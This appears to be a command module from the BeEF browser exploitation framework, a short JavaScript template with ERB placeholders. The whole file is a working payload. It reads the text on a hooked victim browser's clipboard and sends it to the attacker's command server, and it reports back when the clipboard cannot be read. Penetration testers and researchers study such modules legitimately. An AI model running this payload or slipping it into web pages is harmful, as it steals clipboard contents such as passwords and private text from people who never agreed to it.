beef.execute(function() {
		if (clipboardData.getData("Text") !== null) {
			beef.net.send("<%= @command_url %>", <%= @command_id %>, "clipboard="+clipboardData.getData("Text"));
		} else {
			beef.net.send("<%= @command_url %>", <%= @command_id %>, "clipboard=clipboardData.getData is null or not supported.");
		}
});
